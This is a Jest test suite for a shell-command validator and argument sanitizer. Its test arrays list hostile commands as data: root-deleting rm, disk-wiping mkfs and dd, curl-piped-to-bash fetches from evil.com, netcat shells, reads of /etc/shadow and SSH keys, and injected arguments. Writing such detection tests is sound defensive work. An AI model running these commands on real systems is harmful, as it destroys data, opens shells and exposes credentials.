/**
 * Command Validator Tests
 * Tests for security-focused command validation
 */

import { describe, it, expect, jest } from '@jest/globals';
import { 
  validateCommand, 
  sanitizeShellArgument, 
  quoteForShell, 
  getCommandName,
  CommandValidationResult,
  ValidationOptions
} from '../src/lib/command-validator.js';

describe('CommandValidator - Security Tests', () => {
  describe('validateCommand - Dangerous Pattern Detection', () => {
    it('should detect critical filesystem destruction commands', () => {
      const criticalCommands = [
        'rm -rf /',
        'rm -rf /*',  
        'rm -rf /etc',
        'sudo rm -rf /home',
        'rm -rf //'
      ];

      criticalCommands.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.isValid).toBe(false);
        expect(result.errors).toContainEqual(
          expect.objectContaining({
            message: expect.stringContaining('root filesystem'),
            level: 'critical'
          })
        );
      });
    });

    it('should detect filesystem formatting commands', () => {
      const formatCommands = [
        'mkfs /dev/sda1',
        'sudo mkfs.ext4 /dev/sdb1',
        'mkfs -t ext3 /dev/sdc1'
      ];

      formatCommands.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
      });
    });

    it('should detect direct disk write commands', () => {
      const diskCommands = [
        'dd if=/dev/zero of=/dev/sda',
        'sudo dd if=bad.iso of=/dev/sdb'
      ];

      diskCommands.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
      });
    });

    it('should detect privilege escalation attempts', () => {
      const escalationCommands = [
        'sudo su -',
        'sudo su root',
        'sudo passwd root',
        'sudo usermod -G sudo attacker'
      ];

      escalationCommands.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('high');
      });
    });

    it('should detect remote code execution via curl', () => {
      const curlCommands = [
        'curl http://evil.com/shell.sh | bash',
        'curl https://malicious.site/payload.sh | bash',
        'curl http://bad.com/script | sh'
      ];

      curlCommands.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
      });
    });

    it('should detect reverse shell attempts', () => {
      const reverseShellCommands = [
        'nc -l -p 4444 -e /bin/bash',
        'netcat -l -p 4444 -e /bin/sh',
        'nc.traditional -l -p 4444 -e /bin/bash'
      ];

      reverseShellCommands.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
      });
    });

    it('should detect attempts to read sensitive files', () => {
      const sensitiveFileCommands = [
        'cat /etc/shadow',
        'cat /etc/passwd',
        'sudo cat /etc/shadow',
        'cat ~/.ssh/id_rsa'
      ];

      sensitiveFileCommands.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.isValid).toBe(false);
        expect(['critical', 'high']).toContain(result.riskLevel);
      });
    });

    it('should detect process manipulation attacks', () => {
      const processAttacks = [
        'kill -9 1', // Kill init
        'pkill -9 sshd', // Kill SSH daemon
        'killall -9 systemd' // Kill system processes
      ];

      processAttacks.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.isValid).toBe(false);
        expect(['critical', 'high']).toContain(result.riskLevel);
      });
    });

    it('should detect obfuscation attempts', () => {
      const obfuscatedCommands = [
        'echo "YmFzaCAtaSA+YmFzaC==" | base64 -d | bash', // Base64
        'eval $(echo "ls")', // Dynamic eval
        '$(echo rm -rf /tmp/*)', // Command substitution
        'bash -c $(curl evil.com/script.sh)' // Nested execution
      ];

      obfuscatedCommands.forEach(cmd => {
        const result = validateCommand(cmd);
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('high');
      });
    });
  });

  describe('validateCommand - Edge Cases', () => {
    it('should handle empty and null inputs', () => {
      expect(() => validateCommand('')).not.toThrow();
      expect(() => validateCommand(null as any)).not.toThrow();
      expect(() => validateCommand(undefined as any)).not.toThrow();
    });

    it('should handle very long commands', () => {
      const longCommand = 'echo "a".repeat(10000)';
      const result = validateCommand(longCommand, { maxLength: 1000 });
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContainEqual(
        expect.objectContaining({
          message: expect.stringContaining('too long')
        })
      );
    });

    it('should handle unicode and special characters', () => {
      const unicodeCommands = [
        'echo "你好"',
        'ls -la "test$(echo \'🚀\')"', 
        'cat "file\0with\nulls"',
        'echo $(printf "\\x48\\x49")'
      ];

      unicodeCommands.forEach(cmd => {
        expect(() => validateCommand(cmd)).not.toThrow();
      });
    });

    it('should handle command with multiple dangerous patterns', () => {
      const multiDangerous = 'sudo rm -rf / && curl evil.com | bash';
      const result = validateCommand(multiDangerous);
      
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(1);
      expect(result.riskLevel).toBe('critical');
    });
  });

  describe('sanitizeShellArgument', () => {
    it('should escape dangerous shell metacharacters', () => {
      const testCases = [
        { input: 'file; rm -rf /', expected: 'file\\; rm -rf /' },
        { input: 'file`cat /etc/passwd`', expected: 'file\\`cat /etc/passwd\\`' },
        { input: 'file$(whoami)', expected: 'file\\$\\(whoami\\)' },
        { input: 'file&& rm -rf /tmp', expected: 'file\\&& rm -rf /tmp' },
        { input: 'file|| rm -rf /home', expected: 'file\\|| rm -rf /home' },
        { input: 'file| cat /etc/shadow', expected: 'file\\| cat /etc/shadow' }
      ];

      testCases.forEach(({ input, expected }) => {
        expect(sanitizeShellArgument(input)).toBe(expected);
      });
    });

    it('should handle null and undefined inputs', () => {
      expect(sanitizeShellArgument(null as any)).toBe('');
      expect(sanitizeShellArgument(undefined as any)).toBe('');
    });

    it('should preserve safe characters', () => {
      const safeInput = 'file-name_123.txt';
      expect(sanitizeShellArgument(safeInput)).toBe(safeInput);
    });
  });

  describe('quoteForShell', () => {
    it('should properly quote arguments with spaces', () => {
      expect(quoteForShell('file name with spaces')).toBe('"file name with spaces"');
      expect(quoteForShell("file with 'quotes'")).toBe('"file with \'quotes\'"');
    });

    it('should handle special characters', () => {
      const specialChars = '!@#$%^&*(){}[]|;:<>?';
      expect(quoteForShell(specialChars)).toBe(`"${specialChars}"`);
    });

    it('should not double-quote already quoted strings', () => {
      const alreadyQuoted = '"already quoted"';
      expect(quoteForShell(alreadyQuoted)).toBe('"already quoted"');
    });
  });

  describe('getCommandName', () => {
    it('should extract base command correctly', () => {
      const testCases = [
        { input: '/usr/bin/ls -la', expected: 'ls' },
        { input: 'sudo cat /etc/passwd', expected: 'cat' },
        { input: 'env VAR=value command', expected: 'command' },
        { input: 'env VAR1=value1 VAR2=value2 ls -la', expected: 'ls' },
        { input: '   trimmed   command   ', expected: 'command' },
        { input: '', expected: '' }
      ];

      testCases.forEach(({ input, expected }) => {
        expect(getCommandName(input)).toBe(expected);
      });
    });

    it('should handle sudo prefixes correctly', () => {
      expect(getCommandName('sudo ls -la')).toBe('ls');
      expect(getCommandName('sudo -u user command')).toBe('command');
      expect(getCommandName('sudo -H -u root cat /etc/shadow')).toBe('cat');
    });

    it('should handle env prefixes correctly', () => {
      expect(getCommandName('env PATH=/custom ls')).toBe('ls');
      expect(getCommandName('env VAR1=val1 VAR2=val2 VAR3=val3 command')).toBe('command');
      expect(getCommandName('env VAR=value /usr/bin/custom')).toBe('custom');
    });
  });

  describe('ValidationOptions', () => {
    it('should respect whitelist when provided', () => {
      const options: ValidationOptions = {
        whitelist: ['safe-command', 'another-safe'],
        requireWhitelist: true
      };

      const whitelistedCmd = 'safe-command --option value';
      const nonWhitelistedCmd = 'rm -rf /tmp';

      expect(validateCommand(whitelistedCmd, options).isValid).toBe(true);
      expect(validateCommand(nonWhitelistedCmd, options).isValid).toBe(false);
    });

    it('should allow dangerous commands when flag is set', () => {
      const options: ValidationOptions = {
        allowDangerousCommands: true
      };

      const dangerousCmd = 'rm -rf /tmp';
      const result = validateCommand(dangerousCmd, options);

      expect(result.isValid).toBe(true);
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    it('should enforce max length when specified', () => {
      const options: ValidationOptions = {
        maxLength: 100
      };

      const longCmd = 'echo "' + 'a'.repeat(200) + '"';
      const result = validateCommand(longCmd, options);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContainEqual(
        expect.objectContaining({
          message: expect.stringContaining('long')
        })
      );
    });
  });

  describe('Performance Tests', () => {
    it('should handle validation efficiently under load', () => {
      const testCommand = 'echo "test command"';
      const iterations = 1000;

      const startTime = process.hrtime.bigint();
      
      for (let i = 0; i < iterations; i++) {
        validateCommand(testCommand);
      }
      
      const endTime = process.hrtime.bigint();
      const duration = Number(endTime - startTime) / 1000000; // Convert to ms

      // Should complete 1000 validations in under 100ms
      expect(duration).toBeLessThan(100);
    });

    it('should not leak timing information', () => {
      const safeCmd = 'echo hello';
      const dangerousCmd = 'rm -rf /';
      const iterations = 100;

      // Time safe command validation
      const safeStart = process.hrtime.bigint();
      for (let i = 0; i < iterations; i++) {
        validateCommand(safeCmd);
      }
      const safeEnd = process.hrtime.bigint();
      const safeTime = Number(safeEnd - safeStart);

      // Time dangerous command validation
      const dangerousStart = process.hrtime.bigint();
      for (let i = 0; i < iterations; i++) {
        validateCommand(dangerousCmd);
      }
      const dangerousEnd = process.hrtime.bigint();
      const dangerousTime = Number(dangerousEnd - dangerousStart);

      // Times should be relatively close (within 50% difference)
      const ratio = Math.max(safeTime, dangerousTime) / Math.min(safeTime, dangerousTime);
      expect(ratio).toBeLessThan(1.5);
    });
  });

  describe('Fuzz Testing', () => {
    it('should handle random inputs without crashing', () => {
      const randomInputs = [
        '', // Empty
        '\0\0\0', // Null bytes
        '\x01\x02\x03', // Control characters
        'a'.repeat(10000), // Very long
        '!@#$%^&*()[]{}|:;<>?./\\', // Special chars
        '🚀🔥💻', // Unicode emoji
        '\'"\\`', // Quote chars
        ' \t\n\r', // Whitespace variations
      ];

      randomInputs.forEach(input => {
        expect(() => validateCommand(input)).not.toThrow();
        const result = validateCommand(input);
        expect(typeof result.isValid).toBe('boolean');
        expect(Array.isArray(result.errors)).toBe(true);
        expect(Array.isArray(result.warnings)).toBe(true);
        expect(['low', 'medium', 'high', 'critical']).toContain(result.riskLevel);
      });
    });
  });

  describe('Integration with other security features', () => {
    it('should work well with argument sanitization', () => {
      const maliciousCmd = 'cat "$(rm -rf /tmp)"';
      const sanitizedArg = sanitizeShellArgument('$(rm -rf /tmp)');
      const safeCmd = `cat ${sanitizedArg}`;
      
      const result = validateCommand(safeCmd);
      expect(result.isValid).toBe(true);
    });

    it('should handle properly quoted dangerous commands', () => {
      const quotedCmd = 'echo "rm -rf /"; # This is a comment';
      const result = validateCommand(quotedCmd);
      
      // Should detect that this is suspicious even though "quoted"
      expect(result.warnings.length).toBeGreaterThan(0);
    });
  });
});